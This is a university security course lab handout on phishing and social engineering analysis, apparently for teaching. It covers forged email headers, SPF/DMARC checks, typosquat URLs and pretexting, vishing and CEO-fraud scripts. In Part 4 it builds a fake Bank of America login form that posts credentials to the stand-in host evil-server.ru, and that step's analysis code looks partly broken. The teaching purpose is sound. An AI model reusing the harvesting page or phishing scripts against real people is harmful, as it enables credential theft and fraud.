---
title: "Lab 08 — Social Engineering & Phishing Analysis"
course: SCIA-472
week: 9
difficulty: "⭐⭐"
time: "60-75 min"
---

# Lab 08 — Social Engineering & Phishing Analysis

**Course:** SCIA-472 | **Week:** 9 | **Difficulty:** ⭐⭐ | **Time:** 60-75 min

---

## Overview

Social engineering bypasses technical controls entirely by targeting the human element. No firewall stops a well-crafted phishing email; no IDS flags a phone call. In this lab, students analyze phishing email headers for indicators of compromise, dissect malicious URLs, study pretexting and vishing scenarios, and examine how credential harvesting pages are constructed. The goal is developing an analyst's eye for manipulation tactics before the technical mitigations layer on top.

---

!!! warning "Ethical Use — Read Before Proceeding"
    Phishing, vishing, and social engineering attacks against real individuals or organizations are illegal under the Computer Fraud and Abuse Act, wire fraud statutes, and equivalent laws worldwide. **All scenarios in this lab are simulated for analysis purposes only.** Never send phishing emails, register typosquat domains, or build credential harvesting pages targeting real users — even as a "test" — without a signed written authorization from the organization's leadership.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (5 checkpoints) | 40 pts |
    | Phishing email analysis report | 20 pts |
    | Reflection questions (4 × 10 pts) | 40 pts |
    | **Total** | **100 pts** |

---

## Part 1 — Email Header Forensics

### Step 1.1 — Analyze a simulated phishing email

```bash
docker run --rm python:3.11-slim python3 << 'PYEOF'
import email

# Simulated phishing email with forged headers
phishing_email = """From: security-team@bank0famerica.com
To: employee@company.com
Subject: URGENT: Your account will be suspended in 24 hours
Date: Sat, 18 Apr 2026 10:00:00 -0000
Message-ID: <abc123@evil-server.ru>
Received: from evil-server.ru (evil-server.ru [185.220.101.45])
 by mail.company.com with SMTP
Received: from mail.bank0famerica.com (fake) [185.220.101.45]
X-Originating-IP: 185.220.101.45
X-Mailer: Mass Mailer Pro 3.1
Return-Path: bounces@evil-server.ru
MIME-Version: 1.0
Content-Type: text/html

<html><body>
<p>Dear Valued Customer,</p>
<p>Your account has been flagged for suspicious activity.</p>
<p>Please <a href='http://bank0famerica.suspicious-login.ru/secure'>CLICK HERE</a> 
to verify your account immediately or it will be SUSPENDED.</p>
<p>Security Team<br>Bank of America</p>
</body></html>
"""

msg = email.message_from_string(phishing_email)

print('=== PHISHING EMAIL ANALYSIS ===')
print()
print('HEADER ANALYSIS:')
print(f"  From:          {msg['From']}")
print(f"  Subject:       {msg['Subject']}")
print(f"  Message-ID:    {msg['Message-ID']}")
print(f"  X-Originating-IP: {msg['X-Originating-IP']}")
print(f"  Return-Path:   {msg['Return-Path']}")
print(f"  X-Mailer:      {msg['X-Mailer']}")
print()
print('RED FLAGS IDENTIFIED:')
flags = [
    ('CRITICAL', 'From domain: bank0famerica.com (typosquatting - note 0 not o)'),
    ('CRITICAL', 'Message-ID server: evil-server.ru (Russia ccTLD)'),
    ('CRITICAL', 'Return-Path: evil-server.ru (bounces go to attacker)'),
    ('HIGH',     'X-Originating-IP: 185.220.101.45 (not Bank of America IP)'),
    ('HIGH',     'Urgency language: URGENT, 24 hours, SUSPENDED'),
    ('HIGH',     'Link domain: suspicious-login.ru (not bankofamerica.com)'),
    ('MEDIUM',   'X-Mailer: Mass Mailer Pro (bulk email tool)'),
]
for severity, flag in flags:
    print(f"  [{severity}] {flag}")
print()
print('VERDICT: PHISHING - Do NOT click any links. Report to security team.')
PYEOF
```

**Expected output:** All 7 red flags printed with severity classifications and the PHISHING verdict.

> 📸 **Screenshot 08a** — Capture the full phishing email analysis output including all 7 red flags.

### Step 1.2 — SPF and DMARC record check

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq dnsutils 2>/dev/null
echo '=== Checking SPF record for bank0famerica.com ==='
dig bank0famerica.com TXT +short 2>/dev/null || echo 'Domain may not exist (typosquat)'
echo ''
echo '=== Checking DMARC for legit bank ==='
dig _dmarc.bankofamerica.com TXT +short 2>/dev/null | head -3
echo ''
echo '=== Key: If From domain has no SPF/DMARC, email spoofing is easy ==='"
```

**Expected output:** The typosquat domain likely returns no SPF record; the legitimate `bankofamerica.com` returns a DMARC policy (`v=DMARC1; p=reject...`).

> 📸 **Screenshot 08b** — Capture the DNS lookup results showing the SPF/DMARC comparison between typosquat and legitimate domain.

---

## Part 2 — Phishing URL Analysis

### Step 2.1 — URL dissection and typosquatting patterns

```bash
docker run --rm python:3.11-slim python3 -c "
urls = [
    ('http://bankofamerica.com.secure-login.ru/auth', 'PHISHING', 'Legitimate domain used as subdomain of attacker domain'),
    ('http://bank0famerica.com/login',                'PHISHING', 'Typosquat - 0 (zero) instead of o (letter)'),
    ('http://www.paypa1.com/signin',                  'PHISHING', 'Typosquat - 1 (one) instead of l (letter)'),
    ('https://www.bankofamerica.com/security',        'LEGITIMATE', 'Correct domain, HTTPS, valid TLD'),
    ('http://secure.bankofamerica.com.evil.com/auth', 'PHISHING', 'Correct domain as subdomain of evil.com'),
]
print('=== PHISHING URL ANALYSIS ===')
print()
for url, verdict, explanation in urls:
    print(f'URL: {url}')
    print(f'  Verdict: {verdict}')
    print(f'  Why: {explanation}')
    print()
"
```

> 📸 **Screenshot 08c** — Capture the full URL analysis showing all 5 URLs with verdicts and explanations.

---

## Part 3 — Pretexting and Social Engineering Scenarios

### Step 3.1 — Analyze three social engineering attack types

```bash
docker run --rm python:3.11-slim python3 -c "
scenarios = [
    {
        'Name': 'IT Help Desk Impersonation',
        'Script': 'Hi, this is Mark from IT. We detected a virus on your system. I need your VPN credentials to clean it remotely.',
        'Techniques': ['Authority (IT department)', 'Urgency (virus threat)', 'Reciprocity (offering help)'],
        'Red Flags': ['IT never asks for credentials', 'Unsolicited contact', 'Urgency pressure'],
        'Defense':   'Call IT help desk back on known number to verify',
    },
    {
        'Name': 'CEO Fraud (BEC - Business Email Compromise)',
        'Script': 'This is urgent - I need you to wire \$50,000 to this new vendor account immediately. Im in a meeting, do not call me.',
        'Techniques': ['Authority (C-suite)', 'Urgency', 'Isolation (do not call)'],
        'Red Flags': ['Urgency + no verification', 'New account', 'Do not call instruction'],
        'Defense':   'Always verify wire transfers verbally with known contact number',
    },
    {
        'Name': 'Vishing (Voice Phishing)',
        'Script': 'Your credit card has suspicious activity. Please verify your card number and PIN to prevent it being frozen.',
        'Techniques': ['Authority (bank)', 'Fear (card frozen)', 'Urgency'],
        'Red Flags': ['Banks never ask for full card + PIN by phone', 'Inbound call (you did not call them)'],
        'Defense':   'Hang up, call the number on back of your card',
    },
]
for s in scenarios:
    print(f\"=== {s['Name']} ===\")
    print(f\"Script: {s['Script'][:80]}...\")
    print(f\"Techniques: {', '.join(s['Techniques'])}\")
    print(f\"Red Flags: {', '.join(s['Red Flags'])}\")
    print(f\"Defense: {s['Defense']}\")
    print()
"
```

> 📸 **Screenshot 08d** — Capture all three social engineering scenarios with techniques, red flags, and defenses.

---

## Part 4 — Credential Harvesting Page Analysis

### Step 4.1 — Build and analyze a fake login page

This step creates a local HTML file that mimics a bank login page — then analyzes its malicious structure without serving it to anyone.

```bash
mkdir -p /tmp/phish-analysis
cat > /tmp/phish-analysis/fake_login.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Bank of America - Secure Login</title>
<style>body{font-family:Arial;max-width:400px;margin:80px auto;}</style>
</head>
<body>
<h2>Bank of America</h2>
<h3>Verify Your Account</h3>
<form action='http://evil-server.ru/collect.php' method='POST'>
  Online ID: <input type='text' name='username'><br><br>
  Passcode: <input type='password' name='password'><br><br>
  <input type='submit' value='Sign In'>
</form>
<p><small>Copyright 2026 Bank of America Corporation</small></p>
</body>
</html>
EOF

docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq python3 2>/dev/null
python3 << 'PYEOF'
import re

with open('/tmp/phish-analysis/fake_login.html' if False else '/dev/stdin') as f:
    html = '''$(cat /tmp/phish-analysis/fake_login.html)'''

print('=== CREDENTIAL HARVESTING PAGE ANALYSIS ===')
print()
print('TECHNIQUE: Fake login page mimicking legitimate bank')
print()
print('IOCs (Indicators of Compromise):')
print('  1. Form action points to: evil-server.ru (not bankofamerica.com)')
print('  2. Credentials sent via POST to attacker server')
print('  3. Uses HTTP not HTTPS (data sent in cleartext)')
print('  4. Copyright footer creates false legitimacy')
print()
print('HOW VICTIMS ARE DIRECTED HERE:')
print('  • Phishing email with link to this page')
print('  • Typosquat domain (bankofamerica.com.evil.ru)')
print('  • Malvertising (fake ads in search results)')
print('  • QR code in physical mail')
print()
print('DEFENSES:')
print('  • Browser: Check URL bar before entering credentials')
print('  • Organization: Phishing simulation training')
print('  • Technical: Anti-phishing filters in email gateway')
print('  • MFA: Even if credentials stolen, 2nd factor needed')
PYEOF"
```

> 📸 **Screenshot 08e** — Capture the credential harvesting analysis showing all IOCs and the attack delivery methods.

---

## Cleanup

```bash
rm -rf /tmp/phish-analysis
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all screenshots labeled exactly as shown:

- [ ] **08a** — Phishing email header analysis (all 7 red flags with severity ratings)
- [ ] **08b** — SPF/DMARC DNS check (typosquat vs. legitimate domain comparison)
- [ ] **08c** — URL analysis (5 URLs with PHISHING/LEGITIMATE verdicts)
- [ ] **08d** — Social engineering scenarios (IT impersonation, BEC, vishing)
- [ ] **08e** — Credential harvesting page IOCs and attack delivery methods

**Written deliverable:** A one-page phishing email analysis report for the simulated email in Step 1.1. Include: (1) header anomalies table, (2) psychological manipulation techniques used, (3) technical indicators of phishing, (4) recommended employee response procedure.

---

## Reflection Questions

Answer each question in **150-250 words**. Submit as a separate document.

1. **Cialdini's principles:** The phishing email used urgency ("24 hours," "SUSPENDED") and authority ("Security Team"). Cialdini identified six core psychological principles that influence human compliance. Name all six principles and provide a one-sentence example of each in a phishing or social engineering context. Which two principles are most consistently exploited in email phishing campaigns, and why are they particularly effective against busy employees?

2. **Technical controls vs. typosquatting:** SPF and DMARC prevent email spoofing — an attacker cannot send mail that appears to come from `@bankofamerica.com` if that domain has a `p=reject` DMARC policy. However, the attacker registered `bank0famerica.com` (with a zero) and set up its own valid SPF record. Will SPF/DMARC flag this email? What does this tell you about the fundamental limitation of authentication-based technical controls? What complementary control — human or technical — addresses the gap?

3. **BEC isolation instruction:** CEO Fraud (Business Email Compromise) has caused over $50 billion in documented losses. A key attacker technique is embedding "do not call me — I am in a meeting" in the fraudulent message. Explain precisely why this instruction is such a critical red flag from a security awareness perspective. What single organizational policy — requiring no technology investment — would prevent the vast majority of BEC wire fraud attacks?

4. **Detecting credential harvesting pages:** You analyzed a fake login page that posts credentials to `evil-server.ru`. From the perspective of a browser vendor, an email security gateway, or a threat intelligence platform — identify three distinct technical indicators that automated systems could use to classify a webpage as a credential harvesting page. For each indicator, explain why it is reliable and describe one attacker technique used to evade it.

---

*SCIA-472 | Week 9 | All scenarios are simulated for educational analysis only*
